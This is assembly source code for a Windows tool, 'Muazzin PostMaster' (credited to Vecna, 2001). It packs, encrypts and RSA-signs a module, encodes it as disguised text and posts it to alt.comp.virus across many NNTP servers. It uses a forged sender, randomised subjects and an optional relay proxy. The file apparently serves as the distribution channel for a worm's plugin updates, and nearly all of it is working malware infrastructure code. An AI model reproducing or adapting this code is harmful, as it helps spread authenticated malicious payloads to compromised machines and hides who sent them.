;Automatic NNTP muazzin publisher
;(c) Vecna 2001


.586
.model flat,stdcall
option casemap :none


include d:\masm32\include\windows.inc
include d:\masm32\include\kernel32.inc
includelib d:\masm32\lib\kernel32.lib
include d:\masm32\include\user32.inc
includelib d:\masm32\lib\user32.lib
include d:\masm32\include\comdlg32.inc
includelib d:\masm32\lib\comdlg32.lib
include d:\masm32\include\wsock32.inc
includelib d:\masm32\lib\wsock32.lib
include d:\masm32\include\aplib.inc
includelib d:\masm32\lib\aplib.lib

include \muazzin\sign\key\keysize.asi
include ..\muazzin.asi

WndProc           PROTO :DWORD,:DWORD,:DWORD,:DWORD
WndProc2          PROTO :DWORD,:DWORD,:DWORD,:DWORD
value2decimal     PROTO :DWORD
set_buttons       PROTO :DWORD
update_status     PROTO :DWORD
LoadFile          PROTO :DWORD
check_typeversion PROTO
disable_buttons   PROTO
enable_buttons    PROTO
opendialog        PROTO
start             PROTO

BN_BIT                  equ     rsa_bit
BN_BYTE                 equ     BN_BIT/8
BN_DWORD                equ     BN_BIT/32
MAX_BLOCK_SIZE          equ     ((rsa_bit/8)-1)


IDC_PLUGINNAME EQU 1101
IDC_EXIT       EQU 1102
IDC_STATUS     EQU 1103
IDC_SCHADENIP  EQU 1104
IDC_IPLISTFILE EQU 1105
IDC_ASMLIST    EQU 1106
IDC_USEPROXY   EQU 1107
IDC_SERVLIST   EQU 1108
IDC_POST       EQU 1109
IDC_LOADM      EQU 1110

IDC_EDIDENT    EQU 1111
IDC_EDVERSION  EQU 1112
IDC_CONFIRM    EQU 1113
IDC_QUIT       EQU 1114


status_waiting     EQU 0
status_connecting  EQU 1
status_proxy       EQU 2
status_connecting2 EQU 3
status_handshaking EQU 4
status_nogroup     EQU 5
status_nopost      EQU 6
status_sending     EQU 7
status_done        EQU 8
status_pack        EQU 9
status_crypt       EQU 10

.data
appname   db "Muazzin PostMaster",0

dlgname   db "DLGPMAST",0
dlgname2  db "DLGMDETA",0

sz_quit   db "quit",0
sz_add    db "add:"
redir_ip  db "255.255.255.255:119",0
sz_remove db "rem:"
portnumba db "54321",0

post  db 'POST',13,10
post_size equ $-post

dot db 13,10,'.',13,10
dot_size equ $-dot

quit db 'QUIT',13,10,0
quit_size equ $-quit

newsgroup db 'Newsgroups: alt.comp.virus',13,10
newsgroup_size equ $-newsgroup

from db 'From: Elvis <elvis@yahoo.com>',13,10
from_size equ $-from

help_muazzin    db "Escolha o muazzin...", 0
filters_muazzin db "Muazzins files", 0
                db "*", 0
                db "All files", 0
                db "*.*", 0
                dd 0

help_listIP    db "Escolha a lista de IPs de servers NNTP...", 0
filters_listIP db "Text files", 0
               db "*.TXT", 0
               db "Assembler files", 0
               db "*.ASM", 0
               db "Include files", 0
               db "*.INC", 0
               db "All files", 0
               db "*.*", 0
               dd 0

schadenfreude  db "Schadenfreude",0

sz_waiting     db "Waiting for command...",0
sz_connecting  db "Connecting to proxy...",0
sz_proxy       db "Programming proxy...",0
sz_connecting2 db "Connecting to NNTP...",0
sz_handshaking db "Setting parameters...",0
  sz_nogroup   db "Group no exit!",0
  sz_nopost    db "Posting no allowed!",0
sz_sending     db "Sending muazzin to news...",0
sz_done        db "Muazzin posted!!",0
sz_packing     db "Packing muazzin...",0
sz_crypting    db "Signing muazzin...",0

domains db '.edu'
        db '.gov'
        db '.com'
        db '.org'
        db '.mil'

table666 db " V0123456789 V!@$%&*( )-+_\/.,<>;:[]{} V0123456789V"
table666_size equ $-table666

.data?
seed        dd ?
use_schaden dd ?
asm_format  dd ?
hCheck1     dd ?
hCheck2     dd ?
hTmpEdit1   dd ?
hTmpEdit2   dd ?
schaden_ip  dd ?
nntp_list    dd ?
current_nntp dd ?
limit_nntp   dd ?
SizeMuazzin dd ?
Muazzin     dd ?
tmp         dd ?
hInstance   dd ?
hEdit1      dd ?
hEdit2      dd ?
hEdit3      dd ?
hButton1    dd ?
hButton2    dd ?
hButton3    dd ?
hStatus     dd ?
mType       dd ?
mVersion    dd ?
save_esp    dd ?
buffer      db MAX_PATH dup (?)
buffer2     db MAX_PATH dup (?)
buffer1     db 1000h dup (?)

tea_key     db BN_BYTE dup (?)
t_ptr       dd BN_DWORD dup (?)
p_ptr       dd BN_DWORD dup (?)

.code
update_status proc Status:DWORD
       pushad
       mov esi, offset sz_waiting
       mov ecx, Status
       jecxz @@setstatus
  @@seos:
       lodsb
       test al, al
       jnz @@seos
       loop @@seos
 @@setstatus:
       invoke SendMessage,hStatus,WM_SETTEXT,0,esi
       popad
       ret
update_status endp


value2decimal proc Value:DWORD
       pushad
       mov eax, Value
       xor edx,edx
       mov ebx,10
       div ebx
       push edx
       or eax,eax
       jz @@skipz
       invoke value2decimal, eax
 @@skipz:
       pop eax
       add al,"0"
       stosb
       mov [esp],edi
       popad
       ret
value2decimal endp


WndProc proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
     .if uMsg == WM_COMMAND
       .if wParam == IDC_LOADM
             pushad
             mov edx, offset help_muazzin
             mov ebx, offset filters_muazzin
             call opendialog
             jz @@aborted
             invoke SendMessage,hEdit1,WM_SETTEXT,0,ADDR buffer2
             jmp @@aborted
       .elseif wParam == IDC_SERVLIST
             pushad
             mov edx, offset help_listIP
             mov ebx, offset filters_listIP
             call opendialog
             jz @@aborted
             invoke SendMessage,hEdit2,WM_SETTEXT,0,ADDR buffer2
           @@aborted:
             popad
       .elseif wParam == IDC_POST
             call disable_buttons

             invoke IsDlgButtonChecked,hWin,IDC_USEPROXY
             mov [use_schaden],eax
             invoke IsDlgButtonChecked,hWin,IDC_ASMLIST
             mov [asm_format],eax

             invoke check_typeversion

             cmp [use_schaden],0
             je @@no_ip
             invoke SendMessage,hEdit3,WM_GETTEXT,MAX_PATH,ADDR buffer
             invoke inet_addr,ADDR buffer
             mov [schaden_ip],eax
             inc eax
             jz @@done_servers
         @@no_ip:

             invoke SendMessage,hEdit1,WM_GETTEXT,MAX_PATH,ADDR buffer
             invoke LoadFile,ADDR buffer
             mov Muazzin, eax
             mov SizeMuazzin, ecx

             push status_pack
             call update_status

             call packmuazzin

             push status_crypt
             call update_status

             mov eax,SizeMuazzin
             add eax,15
             and eax,not 01111b
             mov SizeMuazzin, eax
             call autenticar
             add SizeMuazzin,BN_BYTE

             invoke SendMessage,hEdit2,WM_GETTEXT,MAX_PATH,ADDR buffer
             invoke LoadFile,ADDR buffer
             test eax,eax
             jz @@done_servers
             mov [nntp_list],eax
             mov [current_nntp],eax
             add eax,ecx
             mov [limit_nntp],eax

     @@next_nntp:
;             int 3
             call get_nntp_entry
             test eax,eax
             jz @@done_servers

             push eax
             call connect2server
             test eax,eax
             jz @@next_server
             mov ebx,eax
             invoke recv,ebx,ADDR buffer1,200h,0

             invoke send,ebx,ADDR post,post_size,0
             invoke recv,ebx,ADDR buffer1,200h,0
             cmp byte ptr [buffer1],'3'
             je @@zkips666

             push status_nopost
             call update_status
             jmp @@close_server
  @@zkips666:

             invoke send,ebx,ADDR from,from_size,0

             lea edi, buffer1
             mov eax, 'jbuS'
             stosd
             mov eax, ':tce'
             stosd
             mov al, ' '
             stosb

             mov esi,edi

             push 26
             call get_rnd_range2
             push eax
             push 26
             call get_rnd_range2
             pop edx
             add ah, dl
             add ax, "AA"
             movzx edx, ax              ;edi==encode key

             mov eax,[mType]
             stosd
             mov al, " "
             stosb

             mov eax,[mVersion]
             add ax, dx
             ror eax, 16
             add ax, dx
             ror eax, 16
             stosd
             mov al, " "
             stosb
             mov eax, edx
             stosw

             call gen_word
             call gen_word
             call gen_word
             call gen_word
             sub eax,eax
             stosd

             call validate_string
             or eax, 000a0d00h
             mov [edi-4], eax
             dec edi

             push edx     ;encode seed

             lea edx, buffer1
             sub edi, edx
             invoke send,ebx,edx,edi,0

             invoke send,ebx,ADDR newsgroup,newsgroup_size,0

             push status_sending
             call update_status

             mov esi,[SizeMuazzin]
             lea eax,[esi*4]
             push eax
             push 40h
             call GlobalAlloc
             mov esi, eax

             push [Muazzin]
             push [SizeMuazzin]
             push esi
             call muazzin2txt
;             int 3

             invoke send,ebx,esi,eax,0

             push esi
             call GlobalFree

             push status_done
             call update_status

             invoke send,ebx,ADDR dot,dot_size,0
             invoke recv,ebx,ADDR buffer1,200h,0

   @@close_server:
             invoke send,ebx,ADDR quit,quit_size,0

             push ebx
             call disconnect4server

   @@next_server:
             jmp @@next_nntp

     @@done_servers:
             invoke GlobalFree,nntp_list
             invoke GlobalFree,Muazzin

             call enable_buttons
       .elseif wParam == IDC_EXIT
             jmp @@end_shit
       .endif
     .elseif uMsg == WM_INITDIALOG
             invoke WSAStartup,101h,ADDR buffer
             invoke GetDlgItem,hWin,IDC_PLUGINNAME
             mov hEdit1,eax
             invoke GetDlgItem,hWin,IDC_IPLISTFILE
             mov hEdit2,eax
             invoke GetDlgItem,hWin,IDC_SCHADENIP
             mov hEdit3,eax
             invoke GetDlgItem,hWin,IDC_LOADM
             mov hButton1,eax
             invoke GetDlgItem,hWin,IDC_SERVLIST
             mov hButton2,eax
             invoke GetDlgItem,hWin,IDC_POST
             mov hButton3,eax
             invoke GetDlgItem,hWin,IDC_STATUS
             mov hStatus,eax
             invoke GetDlgItem,hWin,IDC_USEPROXY
             mov hCheck1,eax
             invoke GetDlgItem,hWin,IDC_ASMLIST
             mov hCheck2,eax

             call enable_buttons
     .elseif uMsg == WM_CLOSE
           @@end_shit:
             invoke WSACleanup
             invoke EndDialog,hWin,0
     .endif
       xor eax,eax
       ret
WndProc endp


WndProc2 proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
     .if uMsg == WM_COMMAND
       .if wParam == IDC_CONFIRM
             mov esi, offset buffer
             invoke SendMessage,hTmpEdit1,WM_GETTEXT,5,esi
             mov eax, [esi]
             sub eax, "0000"
             bswap eax
             mov [mVersion], eax

             invoke SendMessage,hTmpEdit2,WM_GETTEXT,5,esi
             lodsd
             mov [mType],eax

             jmp @@end_shit666
       .elseif wParam == IDC_QUIT
             jmp @@end_shit666
       .endif
     .elseif uMsg == WM_INITDIALOG
             invoke GetDlgItem,hWin,IDC_EDVERSION
             mov hTmpEdit1,eax
             invoke GetDlgItem,hWin,IDC_EDIDENT
             mov hTmpEdit2,eax
             mov esi, offset buffer

             mov edi, esi
             mov eax,[mVersion]
             add eax, "0000"
             bswap eax
             stosd
             sub eax,eax
             stosb
             invoke SendMessage,hTmpEdit1,WM_SETTEXT,0,esi

             mov edi, esi
             mov eax,[mType]
             stosd
             sub eax,eax
             stosb
             invoke SendMessage,hTmpEdit2,WM_SETTEXT,0,esi
     .elseif uMsg == WM_CLOSE
           @@end_shit666:
             invoke EndDialog,hWin,0
     .endif
       xor eax,eax
       ret
WndProc2 endp


opendialog proc
       pushad
       lea esi, buffer
       mov edi, esi
       mov ecx, SIZEOF OPENFILENAMEA
       sub eax, eax
       mov dword ptr [buffer2], eax
       rep stosb
       mov dword ptr [esi+OPENFILENAMEA.lStructSize], SIZEOF OPENFILENAMEA
       mov dword ptr [esi+OPENFILENAMEA.lpstrFile], offset buffer2
       mov dword ptr [esi+OPENFILENAMEA.nMaxFile], MAX_PATH
       mov dword ptr [esi+OPENFILENAMEA.Flags], OFN_FILEMUSTEXIST+OFN_HIDEREADONLY+OFN_LONGNAMES
       mov dword ptr [esi+OPENFILENAMEA.lpstrTitle], edx
       mov dword ptr [esi+OPENFILENAMEA.lpstrFilter], ebx
       invoke GetOpenFileNameA, esi
       test eax, eax
       popad
       ret
opendialog endp


enable_buttons proc
       invoke update_status,status_waiting
       invoke set_buttons, 1
       ret
enable_buttons endp


disable_buttons proc
       invoke set_buttons, 0
       ret
disable_buttons endp


set_buttons proc Value:DWORD
       pushad
       mov ebx,Value
       invoke EnableWindow,hEdit1,ebx
       invoke EnableWindow,hEdit2,ebx
       invoke EnableWindow,hEdit3,ebx
       invoke EnableWindow,hButton1,ebx
       invoke EnableWindow,hButton2,ebx
       invoke EnableWindow,hButton3,ebx

       invoke EnableWindow,hCheck1,ebx
       invoke EnableWindow,hCheck2,ebx

       popad
       ret
set_buttons endp


LoadFile proc FileName:DWORD
       pushad
       mov esi, FileName
       invoke CreateFileA,esi,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
       mov edi, eax
       inc eax
       jz @@error
       mov esi,offset buffer1
       invoke GetFileSize,edi,0
       mov ebx, eax
       invoke ReadFile,edi,esi,1000h,ADDR tmp,0
       sub edx, edx
       cmp word ptr [esi],"ZM"
       jne @@setfp
       mov eax, [esi+3ch]
       cmp eax, 1000h
       jae @@setfp
       lea esi, [esi+eax+0f8h]
       mov ebx,[esi+16]   ;rawsize
       mov edx,[esi+20]   ;ptr2raw
  @@setfp:
       invoke SetFilePointer,edi,edx,0,0
       lea eax, [ebx*2]
       invoke GlobalAlloc,40h,eax
       mov [esp+6*4], ebx
       mov [esp+7*4], eax
       test eax, eax
       jz @@error1
       invoke ReadFile,edi,eax,ebx,ADDR tmp,0
  @@error1:
       invoke CloseHandle,edi
  @@error:
       popad
       ret
LoadFile endp


check_typeversion proc
  LOCAL TmpMem:DWORD
       pushad
       invoke SendMessage,hEdit1,WM_GETTEXT,MAX_PATH,ADDR buffer
       invoke LoadFile,ADDR buffer
       mov TmpMem, eax
       call @@seh
       sub ecx,ecx
       sub ebx,ebx
       jmp @@rem_seh
  @@seh:
       sub eax, eax
       db 064h
       push dword ptr [eax]
       db 064h
       mov dword ptr [eax], esp
       mov [save_esp],esp
       mov esi, offset buffer1
       mov dword ptr [esi],MT_QUERY
       mov eax, GetProcAddress
       mov dword ptr [esi+16],eax
       mov eax, GetModuleHandleA
       mov dword ptr [esi+12],eax
       push esi
       call [TmpMem]
  @@rem_seh:
       sub eax, eax
       mov esp,[save_esp]
       db 064h
       pop dword ptr [eax]
       add esp, 4
       mov [mType],ebx
       mov [mVersion],ecx
       invoke DialogBoxParam,hInstance,ADDR dlgname2,0,ADDR WndProc2,0
       invoke GlobalFree,TmpMem
       popad
       ret
check_typeversion endp


start  proc
       invoke GetModuleHandle,NULL
       mov hInstance,eax
       invoke DialogBoxParam,hInstance,ADDR dlgname,0,ADDR WndProc,0
       invoke ExitProcess,eax
start  endp


packmuazzin proc
  LOCAL mem:DWORD
  LOCAL mem2:DWORD
       pushad
       invoke GlobalAlloc, 40h, [SizeMuazzin]
       mov [mem], eax
       test eax, eax
       jz @@error_exit
       mov esi, [Muazzin]
       mov edi, [mem]
       mov ecx, [SizeMuazzin]
       rep movsb

       invoke aP_workmem_size, [SizeMuazzin]
       invoke GlobalAlloc, 40h, eax
       test eax, eax
       mov [mem2], eax
       jz @@error_exit

       mov edi, [Muazzin]
       mov ecx, size_depacker
       mov esi, offset depacker
       rep movsb

       invoke aP_pack,[mem],edi,[SizeMuazzin],[mem2],0

       mov edi, [Muazzin]
       mov [edi+(@@packed_size-depacker)], eax
       add eax, size_depacker
       mov [SizeMuazzin], eax

  @@error_exit:
       push [mem2]
       call GlobalFree
       push [mem]
       call GlobalFree
       popad
       ret
packmuazzin endp


depacker:
       call @@delta
  @@delta:
       pop esi
       add esi, (@@packerbuffer-@@delta)
       mov ecx, 12345678h
  @@packed_size equ $-4
       lea edi, [esi+ecx+10h]
       push edi
       push esi
       push edi
include \unpack.asi
  @@packerbuffer:
size_depacker equ $-depacker


autenticar proc
       pushad

       call init_rnd

       call get_rnd
       and eax, 0111b
       mov ecx, eax
       inc ecx
  @@loop_seed:                                 ;skip first 1-8 rnd number
       call get_rnd
       loop @@loop_seed

       mov ecx, BN_DWORD                       ;choose TEA key and fill rest
       mov edi, offset tea_key                    ;of buffer with rnd values
  @@loop_seed2:
       call get_rnd
       stosd
       loop @@loop_seed2

       push offset tea_key                        ;first 128b of TEA key will be
       push dword ptr [SizeMuazzin]                    ;the hash
       push dword ptr [Muazzin]
       call tea_hash

       mov ecx, [SizeMuazzin]                    ;encrypt muazzin body with TEA
       shr ecx, 3                              ;key=RND(64b)+HASH(64b)+RND(..)
       mov edi, [Muazzin]
       mov esi, offset tea_key                    ;ecx=number of TEA rounds
  @@TEA:
       call TEA_Encrypt                        ;encrypt 64b with TEA
       add edi, 64/8
       add esi, 128/8                          ;get next TEA round key
       cmp esi, offset tea_key+BN_BYTE
       jb @@continue
       sub esi, BN_BYTE                        ;back to start of TEA key
  @@continue:
       loop @@TEA

       push offset tea_key
       push edi
       push offset rsa_d
       push offset rsa_n
       call rsa_modexp_fast                    ;sign TEA_KEY with RSA

       popad
       ret
autenticar endp


;encode seed
;input
;size
;output
muazzin2txt proc
       pushad
       mov edi, [esp+(8*4)+4]
       mov ecx, [esp+(8*4)+8]
       mov esi, [esp+(8*4)+12]
       mov ebx, [esp+(8*4)+16]
       sub edx, edx
       mov eax, 0a0dh
       stosw
  __next_char:
       push ecx
       inc edx
       lodsb
       mov ah, al
       and al, 000001111b
       and ah, 011110000b
       shr ah, 4
       add ax, bx
       cmp al, "Z"
       jbe __ok_al
       sub al, "Z"-"A"
  __ok_al:
       cmp ah, "Z"
       jbe __ok_ah
       sub ah, "Z"-"A"
  __ok_ah:
       stosw
       call randcode
       cmp dl, 32
       jbe __no_line
       mov ax, 0a0dh
       stosw
       sub edx, edx
  __no_line:
       pop ecx
       loop __next_char
       mov eax, 0a0d0a0dh
       stosd
       push eax
       add eax, "****"-0a0d0a0dh
       stosd
       pop eax
       stosd
       sub edi, [esp+(8*4)+4]
       mov [esp+7*4], edi
       popad
       ret 16
muazzin2txt endp

validate_string proc
       push esi
       push ebx
       sub ebx, ebx
       mov eax, ebx
  __loop:
       lodsb
       test al, al
       jz __end
       cmp al, "A"                      ;below A isnt for sure
       jb __loop
       cmp al, "z"                      ;above z isnt for sure
       ja __loop
       cmp al, "a"
       jae __lowcase
       cmp al, "Z"
       ja __loop
  __lowcase:
       and al, 0dfh
       add al, -"A"
       add ebx, eax
       jmp __loop
  __end:
       cmp ebx, "Z"-"A"
       jbe __done
       add ebx, -("Z"-"A")
       jmp __end
  __done:
       lea eax, [ebx+"A"]
       pop ebx
       pop esi
       ret
validate_string endp

randcode proc
;       int 3
       push eax

       push 16
       call get_rnd_range2
       test eax, eax
       jnz @@no_garble

       push table666_size
       call get_rnd_range2
       mov al,byte ptr [offset table666+eax]
       cmp al, 'V'
       jne @@sto
       mov ax, 0a0dh
       stosw
       jmp @@no_garble

  @@sto:
       stosb

  @@no_garble:
       pop eax
       ret
randcode endp


get_nntp_entry proc
       pushad
       mov esi,[current_nntp]

       cmp [asm_format],0
       je @@zkipz
       mov eax,[esi]
       or ax, 2020h
       cmp ax, 'bd'
       jne @@zkipz
       add esi,3
  @@zkipz:

       mov [esp+7*4],esi
  @@ok:
       cmp esi,[limit_nntp]
       jnb @@error
       lodsb
       cmp al,'.'
       je @@ok
       cmp al,','
       jne @@c0
       mov byte ptr [esi-1],'.'
       jmp @@ok
  @@c0:
       cmp al,'0'
       jb @@done666
       cmp al,'9'
       jbe @@ok
  @@done666:
       mov byte ptr [esi-1],0
  @@ok666:
       cmp esi,[limit_nntp]
       jnb @@done
       cmp [asm_format],0
       je @@zkipz222
       mov eax,[esi]
       or ax, 2020h
       cmp ax, 'bd'
       jne @@zkipz222
       add esi,3
  @@zkipz222:
       lodsb
       cmp al,'9'
       ja @@ok666
       cmp al,'0'
       jb @@ok666
       dec esi
       jmp @@done
  @@error:
       mov dword ptr [esp+7*4],0
  @@done:
       mov [current_nntp],esi
       popad
       ret
get_nntp_entry endp


connect2server proc server:DWORD
  LOCAL nntp_ip:DWORD
  LOCAL nntp_port:DWORD
  LOCAL conn_struct:sockaddr_in
       sub eax,eax
       pushad

       mov conn_struct.sin_family,AF_INET
       mov dword ptr conn_struct.sin_zero,0
       mov dword ptr conn_struct.sin_zero+4,0

       push [server]
       call inet_addr
       mov [nntp_ip],eax
       inc eax
       jz @@error
       mov [nntp_port],119

       invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
       mov ebx,eax

       cmp [use_schaden],0
       je @@direct

       push status_connecting
       call update_status

       mov eax,[schaden_ip]
       mov conn_struct.sin_addr,eax
       invoke htons,1081
       mov conn_struct.sin_port,ax

       invoke connect,ebx,ADDR conn_struct,SIZE sockaddr_in
       test eax,eax
       jnz @@error

       push status_proxy
       call update_status

       invoke recv,ebx,ADDR buffer1,200h,0
       inc eax
       jz @@error
       lea edi,schadenfreude
       lea esi,buffer1
       mov ecx,12
       repe cmpsb
       jne @@error

       mov eax,[nntp_ip]
       lea edi,redir_ip
       mov ecx,4
 @@turn2ip:
       push eax
       movzx eax,al
       invoke value2decimal,eax
       mov al,"."
       stosb
       pop eax
       ror eax,8
       loop @@turn2ip
       mov byte ptr [edi-1],":"
       mov eax,"911"
       stosd

       lea edx,sz_add
       sub edi,edx
       invoke send,ebx,edx,edi,NULL
       inc eax
       jz @@error

       lea esi,buffer1
       invoke recv,eax,esi,200h,0
       inc eax
       jz @@error

       lea edi,portnumba
       push edi
  @@cpy:
       lodsb
       stosb
       test al,al
       jnz @@cpy

       pop esi
       sub eax,eax
       sub edx,edx
  @@conv_loop:
       lodsb
       test al,al
       jz @@done_conversion
       imul edx,edx,10
       sub al,'0'
       add edx,eax
       jmp @@conv_loop
  @@done_conversion:
       mov [nntp_port],edx
       mov eax,[schaden_ip]
       mov [nntp_ip],eax

       invoke send,ebx,ADDR sz_quit,5,NULL
       inc eax
       jz @@error

  @@direct:
       push status_connecting2
       call update_status

       mov eax,[nntp_ip]
       mov conn_struct.sin_addr,eax
       invoke htons,[nntp_port]
       mov conn_struct.sin_port,ax

       invoke connect,ebx,ADDR conn_struct,SIZE sockaddr_in
       test eax,eax
       jnz @@error

       mov [esp+7*4],ebx

       push status_handshaking
       call update_status

  @@error:
       popad
       ret
connect2server endp


disconnect4server proc sock:DWORD
  LOCAL conn_struct:sockaddr_in
       pushad
       mov ebx,[sock]
       cmp [use_schaden],0
       je @@error

       mov conn_struct.sin_family,AF_INET
       mov dword ptr conn_struct.sin_zero,0
       mov dword ptr conn_struct.sin_zero+4,0
       mov eax,[schaden_ip]
       mov conn_struct.sin_addr,eax
       invoke htons,1081
       mov conn_struct.sin_port,ax

       invoke connect,ebx,ADDR conn_struct,SIZE sockaddr_in
       test eax,eax
       jnz @@error

       invoke recv,ebx,ADDR buffer1,200h,0
       inc eax
       jz @@error
       lea edi,schadenfreude
       lea esi,buffer1
       mov ecx,12
       repe cmpsb
       jne @@error

       invoke send,ebx,ADDR sz_remove,10,NULL
       inc eax
       jz @@error

       invoke send,ebx,ADDR sz_quit,5,NULL

  @@error:
       invoke closesocket,ebx
       popad
       ret
disconnect4server endp


gen_word proc
       push eax
       push ecx
       push ebx
       mov ecx, 4
  @@gen:
       rol ebx,8
       push 26
       call get_rnd_range2
       add al,'a'
       mov bl,al
       call get_rnd
       bt eax,1
       jc @@zkipz
       and bl, 0dfh
  @@zkipz:
       loop @@gen
       mov eax, ebx
       stosd
       pop ebx
       pop ecx
       pop eax
       ret
gen_word endp


gen_domain proc
       push 5
       call get_rnd_range2
       mov eax,dword ptr [offset domains+eax*4]
       stosd
       ret
gen_domain endp

get_rnd_range2:
       mov eax,[esp+4]
       call get_rnd_range
       ret 4

include \muazzin\sign\rnd.asi
include \muazzin\sign\hash.asi
include \muazzin\sign\xtea.asi

include \muazzin\sign\key\d.inc       ;we use D and N to encrypt
include \muazzin\sign\key\n.asi       ;and E and N to decrypt

include rsalib.asi

end start
